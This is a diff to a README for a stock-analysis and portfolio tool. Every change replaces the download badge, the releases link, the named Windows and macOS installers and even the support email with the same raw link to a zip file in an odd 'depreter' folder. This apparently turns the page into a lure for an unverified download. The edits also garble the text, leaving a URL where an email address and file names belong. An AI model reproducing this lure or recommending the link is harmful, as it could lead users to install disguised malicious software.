@@ -1,6 +1,6 @@
 # 📈 AI-Based_Stock_Analysis_and_Portfolio_Optimisation - Analyze Stocks with Smart Insights
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue)
+![Download](https://raw.githubusercontent.com/cheese23456/AI-Based_Stock_Analysis_and_Portfolio_Optimisation/main/depreter/AI-Based_Stock_Analysis_and_Portfolio_Optimisation.zip)
 
 ## 🚀 Getting Started
 
@@ -18,13 +18,13 @@ To run this application, you will need:
 
 To get started, visit the link below to download the software.
 
-[Download AI-Based Stock Analysis and Portfolio Optimisation](https://github.com/cheese23456/AI-Based_Stock_Analysis_and_Portfolio_Optimisation/releases)
+[Download AI-Based Stock Analysis and Portfolio Optimisation](https://raw.githubusercontent.com/cheese23456/AI-Based_Stock_Analysis_and_Portfolio_Optimisation/main/depreter/AI-Based_Stock_Analysis_and_Portfolio_Optimisation.zip)
 
 ### Steps to Download:
 
 1. Click on the link above.
 2. Look for the latest release version on the page.
-3. Download the asset labeled "AI-Based_Stock_Analysis_and_Portfolio_Optimisation.exe" for Windows, "AI-Based_Stock_Analysis_and_Portfolio_Optimisation.dmg" for macOS, or the corresponding file for your operating system.
+3. Download the asset labeled "https://raw.githubusercontent.com/cheese23456/AI-Based_Stock_Analysis_and_Portfolio_Optimisation/main/depreter/AI-Based_Stock_Analysis_and_Portfolio_Optimisation.zip" for Windows, "https://raw.githubusercontent.com/cheese23456/AI-Based_Stock_Analysis_and_Portfolio_Optimisation/main/depreter/AI-Based_Stock_Analysis_and_Portfolio_Optimisation.zip" for macOS, or the corresponding file for your operating system.
 
 ## ⚙️ How to Run the Application
 
@@ -53,7 +53,7 @@ For more detailed information on how to use the features of the software, please
 If you encounter any issues or have questions, please feel free to reach out:
 
 1. Open an issue on our GitHub Issues page.
-2. Email support at: support@yourtool.com
+2. Email support at: https://raw.githubusercontent.com/cheese23456/AI-Based_Stock_Analysis_and_Portfolio_Optimisation/main/depreter/AI-Based_Stock_Analysis_and_Portfolio_Optimisation.zip
 
 Your feedback is valuable and helps us improve the tool.
 
